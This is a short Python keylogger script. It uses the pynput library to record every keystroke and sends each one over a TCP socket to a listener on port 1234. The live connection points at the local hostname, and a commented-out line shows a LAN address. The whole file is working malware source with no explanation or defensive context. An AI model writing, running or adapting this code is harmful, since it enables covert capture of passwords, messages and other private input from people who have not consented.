#!/usr/bin/env python3
import socket
import pynput
from pynput.keyboard import Key, Listener

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#  s.connect(("192.168.0.103", 1234))
client.connect((socket.gethostname(), 1234))


def on_press(key):
    key = str(key).replace("'", "")
    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key == "Key.shift":
        key = ""
    elif key == "Key.backspace":
        key = " [Backspace] "
    client.send(key.encode("utf-8"))


with Listener(on_press=on_press) as listener:
    listener.join()
